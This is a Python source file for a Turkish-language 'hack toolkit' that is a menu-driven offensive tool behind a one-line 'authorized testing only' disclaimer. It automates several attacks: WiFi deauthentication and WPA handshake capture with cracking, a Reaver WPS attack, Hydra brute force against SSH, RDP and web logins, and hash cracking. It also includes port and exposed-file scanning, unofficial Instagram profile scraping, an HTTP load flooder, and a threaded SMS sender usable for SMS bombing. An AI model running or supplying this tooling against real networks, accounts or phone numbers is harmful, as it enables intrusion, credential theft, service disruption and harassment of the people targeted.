#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MARKOS HACK TOOLKIT v2.0
Modlar: Port Tarama | Web Zafiyet | WiFi (WPA/WPS) | Sifre (John/Hashcat/Hydra)
        | Instagram (halka acik) | Yuk Testi | SMS Rate-Limit Testi
Sadece yetkilendirilmis guvenlik testlerinde kullan.
"""

import itertools
import os
import shutil
import socket
import ssl
import subprocess
import sys
import threading
import time
from collections import Counter
from queue import Queue

try:
    import requests
    requests.packages.urllib3.disable_warnings(
        requests.packages.urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    print("[-] 'requests' kurulu degil. Kur: pip install requests")
    sys.exit(1)

# ---------------- Renkler ----------------
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; B = "\033[1m"; X = "\033[0m"

BANNER = f"""
{B}{C}=============================================={X}
{B}{C}      MARKOS HACK  PENTEST TOOLKIT  v2.0{X}
{B}{G}      Authorized security testing only{X}
{B}{C}=============================================={X}
"""

MENU = f"""
{G}[1]{X} Port Tarama (IP + acik port)
{G}[2]{X} Web Zafiyet Tarama + Analiz
{G}[3]{X} WiFi Saldirisi (WPA/WPS)
{G}[4]{X} Sifre Saldirisi (John / Hashcat / Hydra)
{G}[5]{X} Instagram Profil Bilgisi (halka acik)
{G}[6]{X} Yuk Testi (kendi altyapin)
{G}[7]{X} SMS Rate-Limit Testi (kendi uygulaman)
{G}[0]{X} Cikis
"""

# ---------------- Yardimcilar ----------------
def bekle():
    input(f"{Y}\n[Devam etmek icin Enter]...{X}")

def sistem_kontrol():
    print(f"{G}[i]{X} Python {sys.version.split()[0]}")
    eksik = []
    for arac in ["nmap", "aircrack-ng", "airodump-ng", "aireplay-ng", "hashcat",
                 "hcxpcapngtool", "john", "hydra", "nuclei", "reaver"]:
        if shutil.which(arac):
            print(f"  {G}[+]{X} {arac}")
        else:
            eksik.append(arac)
    if eksik:
        print(f"  {Y}[-] Eksik: {', '.join(eksik)}{X}")
        print(f"  {Y}    Kurulum: sudo apt install aircrack-ng hashcat hcxtools john hydra nuclei reaver{X}")
    print()

# ============================================================
# 1) PORT TARAMA
# ============================================================
def port_listesi(aralik):
    p = []
    for bolum in aralik.split(","):
        if "-" in bolum:
            a, b = bolum.split("-")
            p.extend(range(int(a), int(b) + 1))
        else:
            p.append(int(bolum))
    return p

def scan_port(hedef, port, banner=False, sonuclar=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        if s.connect_ex((hedef, port)) == 0:
            servis = "?"
            if banner:
                try:
                    s.sendall(b"\r\n")
                    servis = s.recv(100).decode(errors="replace").strip()
                except Exception:
                    pass
            sonuc = f"[+] ACIK  {port:>5}  {servis}"
            print(sonuc)
            if sonuclar is not None:
                sonuclar.append(sonuc)
        s.close()
    except Exception:
        pass

def _worker(hedef, banner, sonuclar, q):
    while not q.empty():
        port = q.get()
        scan_port(hedef, port, banner, sonuclar)
        q.task_done()

def mod_scan():
    print(f"\n{C}=== PORT TARAMA ==={X}")
    hedef = input("Hedef IP/Domain : ").strip()
    aralik = input("Port araligi [1-1000] : ").strip() or "1-1000"
    banner = input("Banner toplansin mi? (e/H) : ").strip().lower() in ("e", "evet", "y", "yes")
    cikti = input("Cikti dosyasi (bos = yok) : ").strip() or None

    q = Queue()
    for p in port_listesi(aralik):
        q.put(p)
    sonuclar = []
    th = [threading.Thread(target=_worker, args=(hedef, banner, sonuclar, q))
          for _ in range(200)]
    for t in th: t.start()
    for t in th: t.join()

    print(f"\n{G}[+]{X} Toplam acik port: {len(sonuclar)}")
    if cikti:
        with open(cikti, "w") as f:
            f.write("\n".join(sonuclar) + "\n")
        print(f"{G}[+]{X} Kaydedildi: {cikti}")

# ============================================================
# 2) WEB ZAFIYET TARAMA
# ============================================================
HEADERS = ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options",
           "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy"]
ORTALAR = ["/.git/config", "/.env", "/robots.txt", "/wp-login.php", "/admin",
           "/backup.zip", "/.htaccess", "/phpinfo.php", "/server-status", "/.DS_Store"]

def mod_web():
    from urllib.parse import urlparse
    print(f"\n{C}=== WEB ZAFIYET TARAMA ==={X}")
    url = input("Hedef URL (https://...) : ").strip()
    nuclei = input("Nuclei taramasi da yapilsin mi? (e/H) : ").strip().lower() in ("e", "evet", "y", "yes")
    timeout = 10

    print(f"\n=== HTTP Analizi: {url} ===")
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False)
        print(f"Durum : {r.status_code}  (son URL: {r.url})")
        for h in HEADERS:
            if h in r.headers:
                print(f"{G}[+]{X} {h}: {r.headers[h][:80]}")
            else:
                print(f"{R}[-]{X} EKSIK header: {h}")
        aco = r.headers.get("Access-Control-Allow-Origin")
        if aco and aco in ("*", "null"):
            print(f"{R}[!]{X} Tehlikeli CORS: {aco}")
        for yol in ORTALAR:
            try:
                r2 = requests.get(url.rstrip("/") + yol, timeout=timeout, verify=False)
                if r2.status_code == 200:
                    print(f"{R}[!]{X} GORUNUR: {yol} ({len(r2.content)} bayt)")
                elif r2.status_code == 403:
                    print(f"{Y}[?]{X} 403: {yol}")
            except Exception:
                pass
    except Exception as e:
        print(f"{R}[-]{X} Baglanti hatasi: {e}")

    p = urlparse(url)
    host, port = p.hostname, p.port or (443 if p.scheme == "https" else 80)
    print(f"\n=== TLS Analizi: {host}:{port} ===")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                ver = ss.version()
                print(f"TLS surumu: {ver}")
                if ver in ("SSLv3", "TLSv1", "TLSv1.1"):
                    print(f"{R}[!]{X} ESKI/GUVENSIZ TLS: {ver}")
    except Exception as e:
        print(f"{R}[-]{X} TLS hatasi: {e}")

    if nuclei:
        print("\n=== Nuclei Taramasi ===")
        try:
            subprocess.run(["nuclei", "-u", url, "-severity", "medium,high,critical", "-silent"])
        except FileNotFoundError:
            print(f"{R}[-]{X} nuclei kurulu degil: sudo apt install nuclei")

# ============================================================
# 3) WIFI SALDIRISI (WPA2 handshake + WPS)
# ============================================================
def _run(cmd):
    print(f"{B}[*]{X} $ {' '.join(cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.stdout:
            print(r.stdout.strip()[:600])
        if r.returncode != 0:
            raise RuntimeError(f"Komut basarisiz: {' '.join(cmd)}")
        return r
    except FileNotFoundError:
        raise RuntimeError(f"Arac bulunamadi: {cmd[0]} (kur: sudo apt install aircrack-ng hashcat hcxtools reaver)")

def mod_wifi():
    print(f"\n{C}=== WIFI SALDIRISI (WPA/WPS) ==={X}")
    iface = input("Kablosuz arayuz [wlan0] : ").strip() or "wlan0"
    bssid = input("Hedef AP BSSID (MAC) : ").strip()
    kanal = input("Kanal : ").strip()
    wl = input("Wordlist [/usr/share/wordlists/rockyou.txt] : ").strip() or "/usr/share/wordlists/rockyou.txt"
    wps = input("WPS Pixie Dust denensin mi? (e/H) : ").strip().lower() in ("e", "evet", "y", "yes")

    eski = os.getcwd()
    os.makedirs("wifi_captures", exist_ok=True)
    os.chdir("wifi_captures")
    try:
        _run(["sudo", "airmon-ng", "check", "kill"])
        _run(["sudo", "airmon-ng", "start", iface])
        mon = iface + "mon"

        airo = subprocess.Popen(["sudo", "airodump-ng", "-c", kanal,
                                 "--bssid", bssid, "-w", "yakala", mon],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)

        _run(["sudo", "aireplay-ng", "-0", "10", "-a", bssid, mon])
        time.sleep(15)
        airo.terminate()

        cap = [f for f in os.listdir(".") if f.endswith(".cap")]
        if not cap:
            raise RuntimeError("Yakalama dosyasi olusmadi - deauth tekrar dene")
        print(f"{G}[+]{X} Kap dosyasi: {cap[0]}")

        _run(["sudo", "hcxpcapngtool", cap[0], "-o", "handshake.hc22000"])
        if os.path.exists("handshake.hc22000"):
            _run(["sudo", "hashcat", "-m", "22000", "handshake.hc22000", wl])
        else:
            print(f"{Y}Handshake yakalanamadi - aircrack ile dene{X}")
            _run(["sudo", "aircrack-ng", cap[0], "-w", wl])

        if wps:
            _run(["sudo", "wash", "-i", mon])
            _run(["sudo", "reaver", "-i", mon, "-b", bssid, "-c", kanal, "-K", "1"])
    finally:
        os.chdir(eski)

# ============================================================
# 4) SIFRE SALDIRISI (John / Hashcat / Hydra)
# ============================================================
def mod_crack():
    print(f"\n{C}=== SIFRE SALDIRISI ==={X}")
    print(f"""
{G}[1]{X} Hash kirma (John / Hashcat)
{G}[2]{X} Cevrimici brute force (Hydra)
{G}[3]{X} Wordlist uret (Crunch tarzi)
""")
    sec = input("Secim : ").strip()

    if sec == "1":
        dosya = input("Hash dosyasi : ").strip()
        fmt = input("Format [nt|wpa|md5|bcrypt] (Enter=nt) : ").strip() or "nt"
        if fmt in ("nt", "wpa"):
            mod = {"nt": "1000", "wpa": "22000"}[fmt]
            wl = input("Wordlist [/usr/share/wordlists/rockyou.txt] : ").strip() or "/usr/share/wordlists/rockyou.txt"
            print(f"{B}[*]{X} Hashcat mod {mod} calisiyor...")
            subprocess.run(["hashcat", "-m", mod, "-a", "0", dosya, wl])
        else:
            print(f"{B}[*]{X} John calisiyor...")
            subprocess.run(["john", "--wordlist=/usr/share/wordlists/rockyou.txt", dosya])
            subprocess.run(["john", "--show", dosya])

    elif sec == "2":
        servis = input("Servis (ssh, ftp, http-post-form, rdp, smb...) : ").strip()
        hedef = input("Hedef IP/Domain : ").strip()
        kullanici = input("Kullanici adi : ").strip()
        wl = input("Wordlist : ").strip()
        cmd = ["hydra", "-l", kullanici, "-P", wl, "-t", "4", "-f", hedef, servis]
        print(f"{B}[*]{X} Hydra: {' '.join(cmd)}")
        subprocess.run(cmd)

    elif sec == "3":
        uz = input("Maks uzunluk [6] : ").strip() or "6"
        cs = input("Karakterler [a-z0-9] : ").strip() or "abcdefghijklmnopqrstuvwxyz0123456789"
        cikti = input("Cikti dosyasi : ").strip()
        sayac = 0
        with open(cikti, "w") as f:
            for l in range(1, int(uz) + 1):
                for d in itertools.product(cs, repeat=l):
                    f.write("".join(d) + "\n")
                    sayac += 1
                    if sayac % 100000 == 0:
                        print(f"{B}[*]{X} {sayac} deneme uretildi...", end="\r")
        print(f"\n{G}[+]{X} Wordlist kaydedildi: {cikti} ({sayac} satir)")

    else:
        print(f"{R}Gecersiz secim{X}")

# ============================================================
# 5) INSTAGRAM HALKA ACIK PROFIL BILGISI
# ============================================================
API = "https://www.instagram.com/api/v1/users/web_profile_info/"
IG_HEADERS = {"x-ig-app-id": "936619743392459",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def mod_ig():
    print(f"\n{C}=== INSTAGRAM PROFIL BILGISI (HALKA ACIK) ==={X}")
    kullanici = input("Kullanici adi : ").strip()
    try:
        r = requests.get(API, params={"username": kullanici}, headers=IG_HEADERS, timeout=15)
        r.raise_for_status()
        u = r.json()["data"]["user"]
        print(f"""
{G}Username{X}   : {u['username']}
{G}User ID{X}    : {u['id']}
{G}Tam ad{X}     : {u.get('full_name', '')}
{G}Biyografi{X}  : {u.get('biography', '')}
{G}Takipci{X}    : {u['edge_followed_by']['count']}
{G}Takip{X}      : {u['edge_follow']['count']}
{G}Gonderi{X}    : {u['edge_owner_to_timeline_media']['count']}
{G}Gizli?{X}     : {u['is_private']}""")
    except requests.exceptions.HTTPError:
        print(f"{R}Kullanici bulunamadi veya API limiti{X}")
    except Exception as e:
        print(f"{R}Hata: {e}{X}")

# ============================================================
# 6) YUK TESTI (kendi altyapin)
# ============================================================
def mod_load():
    print(f"\n{C}=== YUK TESTI (KENDI ALTYAPIN) ==={X}")
    url = input("Hedef URL (kendi siten) : ").strip()
    try:
        sure = int(input("Sure (dakika) [1] : ").strip() or "1")
        es = int(input("Es zamanli baglanti [20] : ").strip() or "20")
    except ValueError:
        sure, es = 1, 20
    method = input("Metod (GET/POST) [GET] : ").strip().upper() or "GET"

    bitis = time.time() + sure * 60
    kilit = threading.Lock()
    istatistik = {"istek": 0, "hata": 0, "sureler": []}

    def calisan():
        while True:
            with kilit:
                if time.time() >= bitis:
                    break
                istatistik["istek"] += 1
            basla = time.time()
            try:
                if method == "POST":
                    requests.post(url, timeout=10, verify=False)
                else:
                    requests.get(url, timeout=10, verify=False)
            except Exception:
                with kilit:
                    istatistik["hata"] += 1
            with kilit:
                istatistik["sureler"].append(time.time() - basla)

    print(f"{B}[*]{X} Yuk testi basladi: {url} | {sure} dk | {es} es zamanli")
    th = [threading.Thread(target=calisan) for _ in range(es)]
    for t in th: t.start()

    onceki = 0
    while any(t.is_alive() for t in th):
        time.sleep(5)
        with kilit:
            toplam = istatistik["istek"]
            hata = istatistik["hata"]
        hiz = (toplam - onceki) / 5
        onceki = toplam
        print(f"    [{time.strftime('%H:%M:%S')}] istek={toplam} hata={hata} hiz~{hiz:.1f} istek/sn")

    for t in th: t.join()

    with kilit:
        toplam = istatistik["istek"]
        hata = istatistik["hata"]
        sureler = istatistik["sureler"]
    ort = (sum(sureler) / len(sureler)) * 1000 if sureler else 0
    en_iyi = min(sureler) * 1000 if sureler else 0
    en_kotu = max(sureler) * 1000 if sureler else 0
    hata_yuzde = (100 * hata / toplam) if toplam else 0

    print(f"""
{G}=== SONUC ==={X}
Toplam istek : {toplam}
Hata         : {hata} (%{hata_yuzde:.1f})
Ortalama     : {ort:.1f} ms
En iyi       : {en_iyi:.1f} ms
En kotu      : {en_kotu:.1f} ms""")

# ============================================================
# 7) SMS RATE-LIMIT TESTI (kendi uygulaman)
# ============================================================
def mod_sms():
    print(f"\n{C}=== SMS RATE-LIMIT TESTI ==={X}")
    print(f"{Y}Not: Kendi uygulamanin SMS endpoint'ini ve kendi test numarani kullan.{X}")
    url = input("Endpoint URL (kendi uygulaman) : ").strip()
    if not url.startswith("http"):
        print(f"{R}Gecersiz URL{X}")
        return
    numara = input("Hedef (test) numarasi : ").strip()
    try:
        adet = int(input("Kac adet SMS gonderilsin : ").strip())
    except ValueError:
        print(f"{Y}Gecersiz sayi, 10 alindi{X}")
        adet = 10
    alan = input("JSON telefon alan adi [phone] : ").strip() or "phone"

    kilit = threading.Lock()
    durumlar = Counter()
    hatalar = Counter()

    def calisan():
        try:
            r = requests.post(url, json={alan: numara}, timeout=10, verify=False)
            with kilit:
                durumlar[r.status_code] += 1
        except Exception as e:
            with kilit:
                hatalar[type(e).__name__] += 1

    print(f"{B}[*]{X} {adet} istek gonderiliyor ({numara})...")
    th = [threading.Thread(target=calisan) for _ in range(adet)]
    for t in th: t.start()
    for t in th: t.join()

    print(f"\n{G}=== SONUC ==={X}")
    for kod, adet_k in sorted(durumlar.items()):
        print(f"  HTTP {kod} : {adet_k}")
    for ad, adet_h in hatalar.items():
        print(f"  Hata {ad} : {adet_h}")

    basarili = sum(v for k, v in durumlar.items() if k < 400)
    sinirli = durumlar.get(429, 0) + durumlar.get(403, 0)
    if sinirli > 0 and basarili < adet * 0.5:
        print(f"{G}[+]{X} Rate-limit CALISIYOR: isteklerin cogu engellendi (SMS bombing korumali).")
    elif basarili >= adet * 0.5:
        print(f"{R}[!]{X} RISK: isteklerin cogu basarili - endpoint rate-limit UYGULAMIYOR olabilir.")
        print("    Oneri: ayni numaraya periyot basina sinir + captcha + IP bazli kisitlama ekle.")
    else:
        print(f"{Y}[?]{X} Karisik sonuc - endpoint yanitlarini inceleyin.")

# ============================================================
# ANA MENU
# ============================================================
def main():
    try:
        os.system("clear" if os.name != "nt" else "cls")
    except Exception:
        pass
    print(BANNER)
    sistem_kontrol()

    moduller = {"1": mod_scan, "2": mod_web, "3": mod_wifi, "4": mod_crack,
                "5": mod_ig, "6": mod_load, "7": mod_sms}

    while True:
        print(MENU)
        sec = input(f"{C}[?] Secim : {X}").strip()
        if sec == "0":
            print(f"{G}Gorusuruz!{X}")
            break
        fn = moduller.get(sec)
        if not fn:
            print(f"{R}Gecersiz secim{X}")
            continue
        try:
            fn()
        except KeyboardInterrupt:
            print(f"\n{Y}Iptal edildi.{X}")
        except Exception as e:
            print(f"{R}[!] Hata: {e}{X}")
        bekle()

if __name__ == "__main__":
    main()
